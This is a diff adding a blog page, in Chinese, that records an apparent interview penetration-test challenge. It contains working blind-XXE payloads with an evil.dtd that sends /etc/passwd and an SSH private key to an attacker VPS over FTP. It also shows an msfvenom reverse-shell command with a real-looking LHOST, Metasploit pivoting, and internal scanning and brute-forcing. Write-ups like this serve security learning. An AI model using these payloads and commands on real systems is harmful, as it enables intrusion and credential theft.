@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>某面试做题记录 | Twe1ve&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+  <meta name="description" content="目标IP：180.101.148.103 前期信息收集: 端口开放情况： 8022 8088 8088对应一个web页面，Apache Tomcat&#x2F;8.0.38 dirsearsh扫目录发现&#x2F;admin&#x2F;目录，一个新建账户功能点，填入信息之后抓包，发现是一个jsp页面，为java环境，且POST数据包的格式为XML，立马想到XXE 然而借助已有的元素进行触发实体名以完成XXE，然而发现在已有元素">
+<meta property="og:type" content="article">
+<meta property="og:title" content="某面试做题记录">
+<meta property="og:url" content="https://github.com/2020/05/19/%E6%9F%90%E9%9D%A2%E8%AF%95%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
+<meta property="og:site_name" content="Twe1ve&#39;s Blog">
+<meta property="og:description" content="目标IP：180.101.148.103 前期信息收集: 端口开放情况： 8022 8088 8088对应一个web页面，Apache Tomcat&#x2F;8.0.38 dirsearsh扫目录发现&#x2F;admin&#x2F;目录，一个新建账户功能点，填入信息之后抓包，发现是一个jsp页面，为java环境，且POST数据包的格式为XML，立马想到XXE 然而借助已有的元素进行触发实体名以完成XXE，然而发现在已有元素">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://github.com/2020/05/19/%E6%9F%90%E9%9D%A2%E8%AF%95%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1.png">
+<meta property="og:image" content="https://github.com/2020/05/19/%E6%9F%90%E9%9D%A2%E8%AF%95%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/2.png">
+<meta property="og:image" content="https://github.com/2020/05/19/%E6%9F%90%E9%9D%A2%E8%AF%95%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/3.png">
+<meta property="og:image" content="https://github.com/2020/05/19/%E6%9F%90%E9%9D%A2%E8%AF%95%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/4.png">
+<meta property="article:published_time" content="2020-05-19T10:03:11.000Z">
+<meta property="article:modified_time" content="2020-05-19T10:05:54.274Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://github.com/2020/05/19/%E6%9F%90%E9%9D%A2%E8%AF%95%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/1.png">
+  
+    <link rel="icon" href="/images/icon.png">
+  
+  
+<link rel="stylesheet" href="/css/index.css">
+
+
+
+  <!-- 百度站長統計-->
+  
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?f4e4f3d9d2532faa71e451f2ab41cbb6";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+  
+<meta name="generator" content="Hexo 4.2.0"><link rel="alternate" href="/atom.xml" title="Twe1ve's Blog" type="application/atom+xml">
+</head>
+
+<div class="main height-100 flex flex-v">
+  <div class="phone-header">
+    <a to="/home" class="mobile-logo" > <img src="/images/logo.svg" /> </a>
+    <a class="menu iconfont icon-menu" onclick="toggleMenu()"></a>
+  </div>
+  <div class="main-top flex flex1">
+    <nuxt-link  to="/home" class="mobile-nav-btn iconfont icon-fenlei"></nuxt-link>
+    <!--主页上左部分-->
+    <div class="height-100 main-left  flex flex-v">
+      <div class="main-left-top flex1">
+        <a class="logo">
+          <img src="/images/logo.svg" />
+          <div class="sub-title">废物Twe1ve的垃圾展示台</div>
+        </a>
+        <nav class="nav">
+
+  
+    
+      <a title="首页"  alt="首页"  v-for="(menu,index) in menus" href="/">
+        <div class="icon"><i class="iconfont icon-home"></i></div>
+        <div class="name">
+          <div class="cnname">首页</div>
+          <div class="enname">Home Page</div>
+        </div>
+      </a>
+
+    
+      <a title="归档"  alt="归档"  v-for="(menu,index) in menus" href="/archives">
+        <div class="icon"><i class="iconfont icon-archives"></i></div>
+        <div class="name">
+          <div class="cnname">归档</div>
+          <div class="enname">Archive Page</div>
+        </div>
+      </a>
+
+    
+      <a title="关于我"  alt="关于我"  v-for="(menu,index) in menus" href="./../about">
+        <div class="icon"><i class="iconfont icon-about"></i></div>
+        <div class="name">
+          <div class="cnname">关于我</div>
+          <div class="enname">About Me</div>
+        </div>
+      </a>
+
+    
+  
+
+  <!--<a href="/link/">
+    <div class="icon"><i class="iconfont icon-link"></i></div>
+    <div class="name">
+      <div class="cnname">友情链接</div>
+      <div class="enname">Friends Web Link</div>
+    </div>
+  </a>-->
+</nav>
+
+      </div>
+
+      <view class="website-msg">
+        <div class="beian"><a target="_blank" href="http://www.miitbeian.gov.cn/"></a></div>
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <div class="beian"><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></div>
+        <!--
+        <div class="theme-drsc">PowerBy:<a href="https://hexo.io" target="_blank">Hexo</a> ThemeBy:<a href="" target="_blank">Soul</a></div>
+        -->
+        <div class="copyright">Copyright &#169 <a href="mailto:yorojogame@gmail.com">2020 Twe1ve&#39;s Blog</a> </div>
+      </view>
+
+      <div class="social flex flex-align-center ">
+        
+          
+            
+          
+        
+      </div>
+    </div>
+    <!--主页上右部分-->
+    <div class="main-right flex1 flex flex-v">
+    <div class="article-content flex1">
+        <div class="article-content-container">
+            <div class="article-title row">
+                <div class="title">某面试做题记录</div>
+                <div class=" other">
+                    <!--<i class="iconfont icon-iconfontordinaryliulan"></i> 56--> <i
+                        class="iconfont icon-shijian"></i>· May 19, 2020 ·</div>
+            </div>
+            <div class="article-message markdown-body">
+                <article class="text" v-highlight>
+                    <p>目标IP：180.101.148.103</p>
+<p>前期信息收集:<br> 端口开放情况：</p>
+<pre><code>8022
+8088</code></pre><p><img src="1.png" alt=""></p>
+<p>8088对应一个web页面，Apache Tomcat/8.0.38</p>
+<p>dirsearsh扫目录发现/admin/目录，一个新建账户功能点，填入信息之后抓包，发现是一个jsp页面，为java环境，且POST数据包的格式为XML，立马想到XXE</p>
+<p>然而借助已有的元素进行触发实体名以完成XXE，然而发现在已有元素中不能出现 &amp; 。否则返回”内部错误”</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE test [
+&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;reg&gt;&lt;name&gt;&amp;xxe&lt;/name&gt;&lt;tel&gt;1&lt;/tel&gt;&lt;email&gt;1&lt;/email&gt;&lt;/reg&gt;</code></pre><p>然后想到 % 触发的形式，也还是会报错,仍然不能成功执行</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE ANY [ &lt;!ENTITY % evil SYSTEM “http://vps_ip/”&gt; %evil; ]&gt;
+&lt;reg&gt;&lt;name&gt;1&lt;/name&gt;&lt;tel&gt;1&lt;/tel&gt;&lt;email&gt;1&lt;/email&gt;&lt;/reg&gt;</code></pre><p>既然是对现有元素的内容进行判断，那么假如我不适应预定义的元素呢？？？</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE acunetix [
+&lt;!ENTITY acunetixent SYSTEM &quot;http://vps_ip/&quot;&gt;
+]&gt;
+&lt;xxx&gt;&amp;acunetixent;&lt;/xxx&gt;</code></pre><p>监听vps 80端口，成功接收到访问，说明XXE确实存在，但是发现为非回显XXE，尝试OOB，这里踩了很大的一个坑，由于之前只接触过PHP的XXE，对JAVA类型的XXE一无所知，导致在这里卡了好久。因为之前PHP中的XXE都是HTTP协议直接读取文件，OOB一直失败，访问了vps上的dtd，但是却没有任何信息返回。然后想到了是不是语言的问题，搜索一下”JAVA blind XXE”，找到了这篇文章： <a href="https://blog.csdn.net/qq_27446553/article/details/51212957，也就是需要用ftp来传输数据" target="_blank" rel="noopener">https://blog.csdn.net/qq_27446553/article/details/51212957，也就是需要用ftp来传输数据</a></p>
+<p>最终构造paylaod如下：</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE root [
+&lt;!ENTITY % remote SYSTEM &quot;http://vps_ip/evil.dtd&quot;&gt;
+%remote;]&gt;
+&lt;root/&gt;</code></pre><p>evil.dtd:(本地借助脚本在33端口起一个ftp服务)</p>
+<pre><code>&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &apos;ftp://vps_ip:33/%file;&apos;&gt;&quot;&gt;
+%int;
+%send;</code></pre><p>先读取/etc/passwd  ；比较正常 的 /etc/passwd文件，发现会以CWD为标志，每段后面的 /  被吃掉 ，处理之后：</p>
+<p><img src="2.png" alt=""></p>
+<p>当前只两个个登录用户root、biubiubiu，已知8022端口为SSH服务，则可以尝试读取id_rsa。root下没有.ssh返回,查看root下的.bash_history：<br>.bash_history </p>
+<pre><code>curl api.ipify.org &lt; exit &lt;
+curl http: &lt; EPSV ALL &lt; EPSV &lt; EPRT |1|172.19.0.2|33967| &lt; RETR 172.2 &lt;
+ls -la &lt; ifconfig &lt; arp -a &lt;
+flag{05150500-2-bf28fdcb02874f4e}</code></pre><p>尝试读取home/biubiubiu/.ssh/id_rsa,成功读取之后对返回信息进行处理。即以CWD为标志，每段后面添加一个 / ，去除掉不必要的符号。这里有个小技巧，因为一行的字符数是不确定的（之前做过比较，可能系统差异吧），所以难以分行，这里直接把id_rsa处理成3行（开始和结束一行，所有中间字符一行），然后使用mobaxterm进行连接（mobaxtrem会自动分行）。</p>
+<p>ssh -i ~/id_rsa  <a href="mailto:biubiubiu@180.101.148.103">biubiubiu@180.101.148.103</a> -p 8022</p>
+<p>16eb94bce0b6:~$ cat /proc/1/cgroup</p>
+<pre><code>10:perf_event:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af9
+9:memory:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af9
+8:freezer:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af9
+7:devices:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af9
+6:net_cls,net_prio:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af9
+5:cpu,cpuacct:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af9
+4:blkio:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af9
+3:cpuset:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af9
+2:pids:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af9
+1:name=systemd:/docker/16eb94bce0b62f635dac745b6b6b07c6057404bf074d16e3449cfe1e23788af9</code></pre><p>当前在一个docker中，<br>然后又发现当前在一个busybox中（su: must be suid to work properly）</p>
+<p>16eb94bce0b6:~$ chmod<br>BusyBox v1.24.2 (2016-08-12 14:38:34 GMT) multi-call binary.<br>且发现当前处在一个Docker Alpine container中</p>
+<p><strong>ashell 逃逸：</strong><br>export SHELL=/bin/sh</p>
+<p>16eb94bce0b6:<del>$ sudo<br>-ash: sudo: not found<br>###实际没有完成逃逸<br>16eb94bce0b6:</del>$sh<br>###成功切换为sh<br>尝试路径修复</p>
+<pre><code>export PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</code></pre><p>结果还是不能使用sudo、su等命令，也就是Docker Alpine container起环境的时候并没有额外添加这些命令。因为Docker Alpine container默认只有可怜的300多个命令</p>
+<p>简单的信息收集走一波：curl和wget可用，直接下载LinEnum.sh脚本</p>
+<pre><code>curl -O https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+16eb94bce0b6:~$ sh LinEnum.sh</code></pre><p>由于好多命令不可用，所以收集到的内容也有限，arp -a发现很多不完整的连接，也没有跨网段通信</p>
+<p>常规提权：suid 、sudo 、Linux-suggest、计划任务、可写路径等都没有，才疏学浅，也没有发现更多提权思路</p>
+<p>这里提权暂时没有其他思路，不过发现比较幸运的是能够使用SSH命令，首先想到的是ssh+proxychains（但是没有密码，也不能新建用户，有点尴尬）、iptables也没有</p>
+<p>###由于这里的ash只能逃逸到sh，而不能逃逸到bash 。 但是用到的端口转发脚本都是bash格式的，所以又得找sh格式的，所以想想还是传一个msf马然后用msf转发操作吧</p>
+<pre><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=66.98.119.8 LPORT=4444 -f elf &gt; tw</code></pre><p>返回的shell很快就被kill掉，进程迁移也失效，</p>
+<p><img src="3.png" alt=""></p>
+<pre><code>set AutoRunScript migrate -f   ###提前设置自动进程迁移
+run autoroute -s 172.19.0.0/24  ###添加路由
+run autoroute -p   ###查看路由添加情况</code></pre><p>发现比之前稍稍稳定一点，刚添加完路由，，又掉了。。。。。。但是进程中确实没有杀毒软件啊,尝试更换为x86的paylaod，还是一样不稳定，但是重连几次之后发现稳定下来了.但是那种大范围扫描会导致断开，所以选择exploit -j，即使断开也能立马回连一个session。而且最重要的是添加的路由还在，不用反复添加。<br>nmap之后简单处理一下，获取存活主机列表：</p>
+<pre><code>cat ip | awk -F &quot;(&quot; &apos;{print $2}&apos; | awk -F &quot;)&quot; &apos;{print $1}&apos; | awk -F &quot;latency&quot; &apos;{print $1}&apos; | grep 172</code></pre><p>结果还没稳定几分钟，又掉了。。。。。。。又开始不稳定，渗透真是一门玄学。。。。</p>
+<p>又是一顿折腾，还是不得行，实在没啥法子了，先放下，然后想一下各种各种，慢慢排除之后，想到是不是因为vps用国外的原因，然后实在不情愿地用起了白嫖来的阿里云ECS（白嫖来只做了一个子域名监控，其他什么环境都没安装，而且阿里云对某些端口的使用也是个迷，就比如4444端口，即使你在安全组里开了它，msf用这个端口监听并不会正常连接。。。）</p>
+<p>ms17_010 发现基本没有开启445端口的机子，0708 也没得。</p>
+<p>yCCN92mswZah6y7uyfvVdES      把这个密码添加到字典中进行ssh、ftp、rdp等爆破</p>
+<p>只能扫描一下内网的常见端口了</p>
+<pre><code>nmap  -p 21,22,23,25,80,445,1433,3306,3389，6379 -Pn 172.19.0.1/24 -T4</code></pre><p>但是全部扫描结果均为下例：</p>
+<p><img src="4.png" alt=""></p>
+<p>然后多方验证，发现nmap扫描结果并不准确，存活主机扫描结果也是一样不准确，，，</p>
+<p>还是用自带的服务扫描模块试试看吧，<br>use auxiliary/scanner/discovery/arp_sweep   ##探测存活主机</p>
+<p>172.18.9.37<br>use auxiliary/scanner/portscan/tcp   ###探测TCP端口服务</p>
+<pre><code>[+] 172.19.0.2:   - 172.19.0.2:22 - TCP OPEN
+[+] 172.19.0.1:   - 172.19.0.1:22 - TCP OPEN
+[+] 172.19.0.3:   - 172.19.0.3:3306 - TCP OPEN
+[+] 172.19.0.2:   - 172.19.0.2:8009 - TCP OPEN
+[+] 172.19.0.1:   - 172.19.0.1:8022 - TCP OPEN
+[+] 172.19.0.2:   - 172.19.0.2:8080 - TCP OPEN
+[+] 172.19.0.1:   - 172.19.0.1:8088 - TCP OPEN
+[+] 172.19.0.3:   - 172.19.0.3:8989 - TCP OPEN</code></pre><p>最后还是回到通过msf添加一个sockets代理，配合proxychains进行操作(同样需要添加路由)<br>use auxiliary/server/socks5</p>
+<p>然后就是172.19.0.1同时也开放了8022端口，nc探测也为openssh服务，尝试使用相同私钥进行登录，没想到成功了，但是貌似还是回到那个docker中。。。。。</p>
+<p>172.18.9.37：</p>
+<pre><code>21/tcp   open  ftp 
+22/tcp   open  ssh
+5432/tcp open  postgresql
+9999/tcp open  abyss
+9999/tcp open  msdtc   Microsoft Distributed Transaction Coordinator</code></pre><p>ssh、postgresql弱口令也还是没有</p>
+<p><strong>总结：</strong></p>
+<p>知识面还是不够广吧，一个Java blind xxe搞了半天才搞定，然后就是读取到的id_rsa处理起来也真的麻烦，一个不注意就导致格式错误。拿到主机普通用户权限，没有办法进行进一步提权，只能通过端口转发进行内网渗透。但是相对来说内网实战经验还是少，不说别的，用msf时阿里云ECS端口问题都要弄老半天，进入内网，只能尝试简单的横向，内网存活机子不多，445端口没有也没有开启，之前拿到的那个密码貌似也没有起到作用，其实一直在期待这个密码能够有一个不错的效果。开放的服务就更少了。ssh、mysql爆破均无果</p>
+
+                </article>
+            </div>
+            <div id="gitalk-container"></div>
+<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<style>
+    .hljs {
+        display: block !important;
+        overflow-x: auto !important;
+        background: #2b2b2b !important;
+        color: #f8f8f2 !important;
+        padding: .5em !important;
+    }
+</style>
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '85810192d72d7f763a9a',
+        clientSecret: 'e9867192041e53ad9f4581db6e50bbe7373a090d',
+        repo: 'myblog',
+        owner: 'callmesoul',
+        admin: ['callmesoul'],
+        id: '', // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+    gitalk.render('gitalk-container')
+</script>
+        </div>
+    </div>
+</div>
+
+<link href="https://cdn.bootcss.com/highlight.js/9.15.7/styles/a11y-dark.min.css" rel="stylesheet">
+<script src="https://cdn.bootcss.com/highlight.js/9.15.9/highlight.min.js"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', (event) => {
+        document.querySelectorAll('pre code').forEach((block) => {
+            hljs.highlightBlock(block);
+        });
+    });
+</script>
+  </div>
+  <!--
+  <div class="main-bottom">
+    <div class="music flex flex-pack-justify flex-align-center">
+      <div class="control">
+        <a onclick="preSong()"><span class="iconfont icon-shangyishou"></span></a>
+        <a onclick="playControl()"><span class="iconfont play-icon icon-kaishi1"></span></a>
+        <a onclick="nextSong()"><span class="iconfont icon-xiayishou-copy"></span></a>
+      </div>
+      <div class="msg">
+        <span class="time"></span>
+        <div class="line" ref="progress-line-warp">
+          <div class="song-msg">周杰伦 - 说好不哭</div>
+          <!--<div class="current-line" ref="progress-line">
+            <a tag="a" class="target" v-on:mousedown.prevent="mousedown"></a>
+          </div>-->
+        </div>
+        <span class="all-time"></span>
+      </div>
+      <div class="right-control">
+        <a class="order-btn flex flex-align-center" onclick="toogleShowMusicList()">
+          <span class="iconfont icon-ttpodicon"></span>
+          <span class="number flex1">3</span>
+        </a>
+      </div>
+      <audio id="audio" class="mian-audio" src="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3">
+        Your browser does not support the audio element.
+      </audio>
+    </div>
+  </div>
+  <div class="music-list">
+    <div id="musiclist">
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 说好不哭" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E8%AF%B4%E5%A5%BD%E4%B8%8D%E5%93%AD.mp3" onclick="changePlayIndex(0)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">说好不哭 - 周杰伦</span>
+        </a>
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 爱在西元前" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E7%88%B1%E5%9C%A8%E8%A5%BF%E5%85%83%E5%89%8D%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(1)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">爱在西元前 - 周杰伦</span>
+        </a>
+      
+        <a class="music-item flex flex-align-center" data-name="周杰伦 - 龙拳" data-url="https://callmesoul-blog.oss-cn-shenzhen.aliyuncs.com/music/%E5%91%A8%E6%9D%B0%E4%BC%A6%20-%20%E9%BE%99%E6%8B%B3%20%5Bmqms2%5D.mp3" onclick="changePlayIndex(2)" >
+          <span class="iconfont" class="icon-kaishi"></span>
+          <span class="title flex1">龙拳 - 周杰伦</span>
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+<script>
+  var playIndex = localStorage.getItem('playIndex') ? parseInt(localStorage.getItem('playIndex')) : 0
+  let musics = $('.music-item')
+  musics.eq(playIndex).addClass('active')
+  var audio = document.getElementById("audio");
+
+  $('.song-msg').html(musics[playIndex].dataset.name)
+  audio.src = musics[playIndex].dataset.url
+
+
+  var playbtn = document.getElementsByClassName("play-icon")[0];
+  var playing = false;
+  audio.loop = false;
+  audio.addEventListener('ended', function () {
+    playbtn.classList.remove("icon-kaishi")
+    playbtn.classList.add("icon-kaishi1")
+    playing = false
+  }, false);
+  audio.addEventListener('play', function () {
+    playbtn.classList.remove("icon-kaishi1")
+    playbtn.classList.add("icon-kaishi")
+    playing= true
+  }, false);
+  audio.addEventListener('pause', function () {
+    playbtn.classList.remove("icon-kaishi")
+    playbtn.classList.add("icon-kaishi1")
+    playing = false
+  }, false);
+  function toogleShowMusicList() {
+    var musiclist = document.getElementsByClassName("music-list")[0];
+    if(musiclist.className.indexOf("active") === -1){
+      musiclist.classList.add("active")
+    }else{
+      musiclist.classList.remove("active");
+    }
+  }
+
+  function playControl() {
+    if(playing){
+      audio.pause()
+    }else{
+      audio.play()
+    }
+  }
+
+  function changePlayIndex(index) {
+    if(playIndex !== index){
+      localStorage.setItem('playIndex',index)
+      playIndex = index
+      musics.removeClass('active')
+      musics.eq(playIndex).addClass('active')
+      $('.song-msg').html(musics[playIndex].dataset.name)
+      audio.src = musics[playIndex].dataset.url
+      audio.play()
+    }else{
+      playControl()
+    }
+  }
+
+  function preSong() {
+    var index
+    if(playIndex === 0){
+      index = musics.length - 1
+    }else{
+      index = playIndex - 1
+    }
+    changePlayIndex(index)
+  }
+
+  function nextSong() {
+    var index
+    if(playIndex === musics.length - 1){
+      index = 0
+    }else{
+      index = playIndex + 1
+    }
+    changePlayIndex(index)
+  }
+-->
+  function toggleMenu() {
+    var mainLeft = $('.main-left')
+    if(mainLeft.hasClass('active')){
+      mainLeft.removeClass('active')
+      $('.menu').removeClass('icon-close')
+      $('.menu').addClass('icon-menu')
+    }else{
+      mainLeft.addClass('active')
+      $('.menu').removeClass('icon-menu')
+      $('.menu').addClass('icon-close')
+    }
+  }
+</script>
